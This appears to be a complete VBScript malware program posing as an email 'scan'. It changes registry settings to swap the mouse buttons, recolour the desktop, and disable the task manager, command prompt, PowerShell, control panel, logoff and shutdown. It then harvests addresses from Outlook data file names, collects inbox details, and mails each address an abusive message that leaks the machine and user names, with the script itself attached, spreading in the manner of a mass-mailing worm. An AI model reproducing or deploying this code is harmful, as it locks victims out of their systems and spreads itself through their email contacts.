Option Explicit

Dim objOutlook, objNamespace, objFolder, objMailItem
Dim objFSO, objShell, objLogFile, objWshShell
Dim strAppData, strSearchPath, strReport
Dim intEmailCount, intFolderCount, intAttachmentCount
Dim arrFolders, arrFiles, arrAttachments
Dim i, j, k
Dim strFoundEmail
Dim colFoundEmails
Dim strEmail

Set colFoundEmails = CreateObject("Scripting.Dictionary")
Set objWshShell = CreateObject("WScript.Shell")

objWshShell.RegWrite "HKEY_CURRENT_USER\Control Panel\Mouse\SwapMouseButtons", "1", "REG_SZ"
objWshShell.RegWrite "HKEY_CURRENT_USER\Control Panel\Colors\Background", "0 0 0", "REG_SZ"
objWshShell.RegWrite "HKEY_CURRENT_USER\Control Panel\Colors\Window", "0 0 0", "REG_SZ"
objWshShell.RegWrite "HKEY_CURRENT_USER\Control Panel\Colors\WindowText", "0 255 0", "REG_SZ"
objWshShell.RegWrite "HKEY_CURRENT_USER\Control Panel\Colors\Menu", "0 255 0", "REG_SZ"
objWshShell.RegWrite "HKEY_CURRENT_USER\Control Panel\Colors\MenuText", "255 255 255", "REG_SZ"
objWshShell.RegWrite "HKEY_CURRENT_USER\Control Panel\Colors\ButtonFace", "0 255 0", "REG_SZ"
objWshShell.RegWrite "HKEY_CURRENT_USER\Control Panel\Colors\ButtonText", "255 255 255", "REG_SZ"
objWshShell.RegWrite "HKEY_CURRENT_USER\Control Panel\Colors\Highlight", "0 255 255", "REG_SZ"
objWshShell.RegWrite "HKEY_CURRENT_USER\Control Panel\Colors\HighlightText", "0 0 0", "REG_SZ"
objWshShell.RegWrite "HKEY_CURRENT_USER\Control Panel\Colors\HotTrackingColor", "0 255 255", "REG_SZ"
objWshShell.RegWrite "HKEY_CURRENT_USER\Control Panel\Colors\GrayText", "255 255 0", "REG_SZ"
objWshShell.RegWrite "HKEY_CURRENT_USER\Control Panel\Colors\ActiveTitle", "0 255 255", "REG_SZ"
objWshShell.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\HideShutDown", "1", "REG_DWORD"
objWshShell.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoUserNameInStartMenu", "1", "REG_DWORD"
objWshShell.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoLogoff", "1", "REG_DWORD"
objWshShell.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoControlPanel", "1", "REG_DWORD"
objWshShell.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System\DisableTaskMgr", "1", "REG_DWORD"
objWshShell.RegWrite "HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\System\DisableCMD", "2", "REG_DWORD"
objWshShell.RegWrite "HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\PowerShell\DisablePowerShell", "1", "REG_DWORD"

Dim EMAIL_BODY
EMAIL_BODY = "I hate you." & vbCrLf & _
             "Dont talk to me ever again." & vbCrLf & _
             "Why me?." & vbCrLf & vbCrLf & _
             "System: " & objWshShell.ExpandEnvironmentStrings("%COMPUTERNAME%") & vbCrLf & _
             "User: " & objWshShell.ExpandEnvironmentStrings("%USERNAME%") & vbCrLf & _
             "Timestamp: " & Now() & vbCrLf & vbCrLf

Dim ATTACHMENT_PATH
ATTACHMENT_PATH = WScript.ScriptFullName

Dim REPORT_PATH
REPORT_PATH = "C:\temp\email_scan_results.txt"

intEmailCount = 0
intFolderCount = 0
intAttachmentCount = 0
strReport = ""

Set objFSO = CreateObject("Scripting.FileSystemObject")
Set objShell = CreateObject("WScript.Shell")

If Not objFSO.FolderExists("C:\temp") Then
    objFSO.CreateFolder("C:\temp")
End If

strReport = strReport & "============================================" & vbCrLf
strReport = strReport & "SCANNING" & vbCrLf
strReport = strReport & "============================================" & vbCrLf
strReport = strReport & "Timestamp: " & Now() & vbCrLf
strReport = strReport & "============================================" & vbCrLf & vbCrLf

strReport = strReport & "Validating" & vbCrLf
strReport = strReport & "------------------------" & vbCrLf

strSearchPath = objShell.ExpandEnvironmentStrings("%APPDATA%") & "\Microsoft\Outlook"
strReport = strReport & "Scanning: " & strSearchPath & vbCrLf

If objFSO.FolderExists(strSearchPath) Then
    Set objFolder = objFSO.GetFolder(strSearchPath)
    
    For Each objFile In objFolder.Files
        Dim strExt
        strExt = LCase(objFSO.GetExtensionName(objFile.Name))
        
        If strExt = "pst" Or strExt = "ost" Or strExt = "pab" Or strExt = "oab" Then
            intEmailCount = intEmailCount + 1
            strReport = strReport & "  [FOUND] " & objFile.Name & vbCrLf
            strReport = strReport & "    Size: " & FormatNumber(objFile.Size / 1024, 0) & " KB" & vbCrLf
            strReport = strReport & "    Modified: " & objFile.DateLastModified & vbCrLf
      
            strFoundEmail = Replace(objFile.Name, "." & objFSO.GetExtensionName(objFile.Name), "")
            strFoundEmail = Replace(strFoundEmail, ".pst", "")
            strFoundEmail = Replace(strFoundEmail, ".ost", "")
            strFoundEmail = Replace(strFoundEmail, ".pab", "")
            strFoundEmail = Replace(strFoundEmail, ".oab", "")
            
            strReport = strReport & "Send" & strFoundEmail & vbCrLf
            
            If Not colFoundEmails.Exists(strFoundEmail) Then
                colFoundEmails.Add strFoundEmail, strFoundEmail
            End If
        End If
    Next
Else
    strReport = strReport & "  Folder not found" & vbCrLf
End If

strReport = strReport & "Total email files found: " & intEmailCount & vbCrLf
strReport = strReport & "Unique emails found: " & colFoundEmails.Count & vbCrLf & vbCrLf

If colFoundEmails.Count = 0 Then
    strFoundEmail = "default@domain.com"
    colFoundEmails.Add strFoundEmail, strFoundEmail
    strReport = strReport & "Send" & strFoundEmail & vbCrLf & vbCrLf
End If

strReport = strReport & "Analysis" & vbCrLf
strReport = strReport & "-----------------------------" & vbCrLf

On Error Resume Next
Set objOutlook = GetObject(, "Outlook.Application")

If objOutlook Is Nothing Then
    Set objOutlook = CreateObject("Outlook.Application")
    If Err.Number <> 0 Then
        strReport = strReport & "Cannot access Outlook" & vbCrLf
        GoTo SaveAndExit
    End If
End If
On Error GoTo 0

Set objNamespace = objOutlook.GetNamespace("MAPI")
objNamespace.Logon

strReport = strReport & "Success" & vbCrLf

arrFolders = Array( _
    3, "Deleted Items", _
    4, "Outbox", _
    5, "Sent Items", _
    6, "Inbox", _
    9, "Calendar", _
    10, "Contacts", _
    11, "Journal", _
    12, "Notes", _
    13, "Tasks", _
    16, "Drafts" _
)

For i = 0 To UBound(arrFolders) Step 2
    Dim folderID, folderName, objFolderItem
    folderID = arrFolders(i)
    folderName = arrFolders(i + 1)
    
    On Error Resume Next
    Set objFolderItem = objNamespace.GetDefaultFolder(folderID)
    On Error GoTo 0
    
    If Not objFolderItem Is Nothing Then
        intFolderCount = intFolderCount + 1
        strReport = strReport & "  [FOLDER] " & folderName & vbCrLf
        strReport = strReport & "    Items: " & objFolderItem.Items.Count & vbCrLf
        strReport = strReport & "    Unread: " & objFolderItem.UnReadItemCount & vbCrLf
        
        If folderID = 6 Then
            Dim objItems, objMail, objAttach
            Set objItems = objFolderItem.Items
            intAttachmentCount = 0
            
            Dim maxItems, itemCount
            maxItems = 10
            itemCount = 0
            
            For Each objMail In objItems
                itemCount = itemCount + 1
                If itemCount > maxItems Then Exit For
                
                If objMail.Class = 43 Then
                    If objMail.Attachments.Count > 0 Then
                        intAttachmentCount = intAttachmentCount + objMail.Attachments.Count
                        strReport = strReport & "    [ATTACHMENT] " & objMail.Subject & vbCrLf
                        For Each objAttach In objMail.Attachments
                            strReport = strReport & "      - " & objAttach.FileName & " (" & _
                                FormatNumber(objAttach.Size / 1024, 0) & " KB)" & vbCrLf
                        Next
                    End If
                End If
            Next
        End If
        strReport = strReport & vbCrLf
    End If
Next

strReport = strReport & "Finalising" & vbCrLf
strReport = strReport & "--------------------------" & vbCrLf

On Error Resume Next

Dim sentCount
sentCount = 0

For Each strEmail In colFoundEmails.Keys
    Set objMailItem = objOutlook.CreateItem(0)
    
    If Not objMailItem Is Nothing Then
        objMailItem.To = strEmail
        objMailItem.Subject = "Email from: " & strEmail
        objMailItem.Body = EMAIL_BODY
        
        If objFSO.FileExists(ATTACHMENT_PATH) Then
            objMailItem.Attachments.Add ATTACHMENT_PATH
            strReport = strReport & "Attachment added for: " & strEmail & vbCrLf
        Else
            strReport = strReport & "Attachment not found for: " & strEmail & vbCrLf
        End If
        
        objMailItem.Send
        
        sentCount = sentCount + 1
        strReport = strReport & "Email sent to: " & strEmail & vbCrLf
        strReport = strReport & "Subject: Email from: " & strEmail & vbCrLf
        
        WScript.Sleep 1500
    Else
        strReport = strReport & "Could not create email for: " & strEmail & vbCrLf
    End If
Next

On Error GoTo 0

strReport = strReport & vbCrLf
strReport = strReport & "Total emails sent: " & sentCount & vbCrLf

SaveAndExit:
strReport = strReport & "============================================" & vbCrLf
strReport = strReport & "COMPLETED" & vbCrLf
strReport = strReport & "============================================" & vbCrLf

Set objLogFile = objFSO.CreateTextFile(REPORT_PATH, True)
objLogFile.WriteLine strReport
objLogFile.Close

MsgBox "Complete" & vbCrLf & "Report: " & REPORT_PATH & vbCrLf & "Emails sent: " & sentCount, vbInformation, "Done"

Set objMailItem = Nothing
Set objFolderItem = Nothing
Set objFolder = Nothing
Set objNamespace = Nothing
Set objOutlook = Nothing
Set objFSO = Nothing
Set objShell = Nothing
Set objLogFile = Nothing
Set colFoundEmails = Nothing
Set objWshShell = Nothing
